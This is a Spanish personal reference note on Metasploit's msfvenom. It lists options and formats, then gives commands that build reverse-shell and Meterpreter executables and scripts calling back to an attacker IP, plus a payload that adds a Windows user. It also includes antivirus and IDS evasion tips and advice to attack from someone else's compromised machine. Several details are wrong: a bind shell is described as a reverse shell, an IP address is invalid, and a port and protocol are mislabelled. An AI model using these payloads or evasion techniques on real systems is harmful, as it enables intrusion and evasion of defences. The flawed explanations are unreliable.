#herramienta 

---

# Introducción
> [!INFO] Definición
> Herramienta de consola para generar [[Payload|Payloads]] y [[Shellcode|Shellcodes]].
> - Perteneciente al [[Framework]] de [[Metasploit]].

# Opciones
Antes de empezar, algo a tener muy en cuenta:
> [!INFO] LHOST/LPORT vs RHOST/RPORT
> **`L`**`HOST` y **`L`**`PORT`: [[IP]] y [[Puerto]] de la **máquina local** -> Máquina **atacante**.
> **`R`**`HOST` y **`R`**`PORT`: [[IP]] y [[Puerto]] de la **máquina remota** -> Máquina **víctima**.
> - La máquina atacante suele ser una máquina desprotegida u obtenida por [[Pivoting]] (**nunca la mía**).
^d83e1d

## `-l <tipo>`
Listar los módulos disponibles del tipo indicado, donde *tipo*: `payloads`, `encoders`, `nops`, `platforms`, `archs`, `encrypt`, `formats` o `all`.

## `-p <payload>`
Indica el [[Payload]] que va a cargarse.
- Puede *pipearse* con `-` o [[STDIN]] como `payload`.

## `-f <formato>`
Declara el formato del fichero de salida tras ejecutar el comando.
Los formatos pueden ser:

### Transformadores
Generan un **programa que carga el [[Payload]]** según la opción indicada.
- Se tiene que asociar a un programa que, al ejecutarse, ejecuta ese código.

Ejemplos del campo `<formato>`:
- `base32`
- `base64`
- `bash`, `sh`
- `c`
- `csharp`
- `dword`, `dw`
- `hex`
- `java`
- `js_be`
- `js_le`
- `num`
- `perl`, `pl`
- `powershell`, `ps1`
- `python`, `py`
- `raw`
- `ruby`,`rb`
- `vbapplication`
- `vbscript`

### Ejecutables
Generan un **archivo ejecutable** infectado.
- Se ha entrado en la máquina y se está realizando [[Escalado de privilegios]].

Ejemplos del campo `<formato>`:
- `asp`
- `aspx`
- `aspx-exe`
- `axis2`
- `dll`
- `elf`
- `elf-so`
- `hta-psh`
- `jar`
- `exe`
- `exe-only`
- `exe-service`
- `exe-small`
- `jsp`
- `loop-vbs`
- `macho`
- `msi`
- `msi-nouac`
- `osx-app`
- `psh`
- `psh-cmd`
- `psh-reflection`
- `python-reflection`
- `vba`
- `vba-exe`
- `vba-psh`
- `vbs`
- `war`

## `-e <encoder>`
Define el encoder que se usará en la ejecución.

 Ejemplos de encoders:
1. Sin encoder.
2. Encoder que suelen colar.
3. Buen encoder.

> [!INFO] Los algoritmos de encoders se ponen a prueba en [[Virus Total]].

### Ejemplos
```shell
msfvenom -p linux/x64/shell_bind_tcp LHOST=192.168.56.1 LPORT=80 -f c
```
Genera un programa `.c` que carga un [[Payload]] que genera un [[Reverse Shell]] vía [[TCP]] que conecta con `192.168.566.1:80`; la máquina víctima debe ser una [[Linux]] de [[Arquitectura#64 bits|64 bits]].

```shell
msfvenom -p linux/x64/shell_bind_tcp LHOST=192.168.56.1 LPORT=80 -e x64/xor -f c
```
Hace lo mismo que el anterior, pero aplica un cifrado *xor* para [[Arquitectura#64 bits|arquitecturas de 64 bits]].

```shell
msfvenom -p linux/x64/shell_bind_tcp LHOST=192.168.56.1 LPORT=80 -e x86/shikata_ga_nai -f c
```
Hace lo mismo que el primero, pero aplica un cifrado *shikata ga nai* para [[Arquitectura#32 bits|arquitecturas de 32 bits]].

## `-service-name <valor>`
Define el nombre del servicio cuando se genera un ejecutable de dicho servicio.

## `-sec-name <valor>`
Define el nombre de sección cuando se generan ejecutables grandes para [[Windows]].
- Por defecto, genera una cadena de 4 letras.

## `-smallest`
Prueba todos los encoders y genera la salida escogiendo aquel que produzca un [[Payload]] de menor tamaño.

## `-encrypt <cifrado>`
Define el cifrado que se aplicará al [[Payload]].
- Si el cifrado requiere clave, puede usarse `-encrypt-key <clave>`.
- Si el cifrado requiere vector de inicialización, puede usarse `-encrypt-iv`.

> [!INFO] Se utiliza para evitar los [[IDS|IDSs]] y los [[Antivirus]].

## `-a <arquitectura>`
Define la arquitectura que usarán para el [[Payload]] y el encoder.
- *x32, x64, x86...*

## `-platform <plataform>`
Define el sistema operativo para el [[Payload]].
- [[Windows]], [[Linux]], mainframe, [[OpenBSD]], [[AIX]], [[Android]]...

> [!INFO] No hay [[Antivirus]] para mainframes.

## `-o <fichero>`
Define el nombre del fichero generado.
- Por defecto, el fichero acaba en [[STDOUT]], donde puede ser [[Pipeo|Pipeado]] a un fichero, a ==named fifo==, a `nc`...

## `-b <caracteres>`
Define una lista de caracteres a evitar.
- Se define sin espacios, sin comas, en [[Hexadecimal]] y separados por `\x`.
-> [[Inyección SQL]]

## `-n <tamaño>`
Inserta bloques NOPs del tamaño indicado al incio del [[Payload]].

Utilizando el modificador `-pad-nops`, el tamaño indicado se interpreta como el tamaño total del [[Payload]], generando automáticamente los NOPs necesarios para cumplirlo.

## `-s <tamaño>`
Define el tamaño del [[Payload]] antes de ofuscarlo con el encoder.

Utilizando `-encoder-space <tamaño>` se logra lo mismo, pero por defecto, su valor es el mismo que se hubiera pasado usando `-s`.

## `-i <veces>`
Define las veces que se aplica el encoder.
-> Útil contra [[IDS|IDSs]] que leen tráfico en `base64` y lo descodifican (cuando en realidad se aplicó $i$ veces).

## `-c <ruta>`
Añade el [[Shellcode]] *win32* adicional indicado.

## `-x <ruta>`
Utiliza un ejecutable legítimo como base para generar la salida.

## `-k`
Define que se mantenga el ejecutable legítimo (indicado con `-x`) en el ejecutaable infectado, lanzando el [[Payload]] como una nueva [[Hebra]].

## `-v <valor>`
Permite especificar un nombre de variable distinto del estándar en algunos formatos de salida.

## `-t <tiempo>`
Cantidad de segundos que espera para leer el [[Payload]] desde [[STDIN]].
- Por defecto, el valor es 30 segundos.
- Usar 0 como valor anula esta opción.

## Ejemplos
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=80 -f exe > shell1.exe
```
Genera un archivo ejecutable para [[Windows]] que al abrirse, genera una [[Reverse Shell]] vía [[TCP]] conectando con `192.168.56.1:80` (mi máquina local) y ejecuta [[Meterpreter]].

```shell
msfvenom -p windows/meterpreter_reverse_http LHOST=192.168.56.1 LPORT=1025 HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -f exe > shell2.exe
```
Genera un archivo ejecutable para [[Windows]] que al abrirse, genera una [[Reverse Shell]] vía [[TCP]] conectando con `192.168.56.1:80` (mi máquina local) y ejecuta [[Meterpreter]].

```shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=1025 -f elf > shell3.elf
```

```shell
msfvenom -p windows/adduser USER="invitado69" PASS="28veintenueve" -f exe > adduser.exe
```

```shell
msfvenom -p cmd/unix/reverse_python LHOST=192.168.56.1 LPORT=1025 -f raw > shell4.py
```

```shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.56.1 LPORT=1025 -f raw > shell5.php
```

```shell
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.56.1 LPORT=1025 -f raw > shell6.sh
```

```shell
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.56.1 LPORT=1025 -f raw > shell7.pl
```
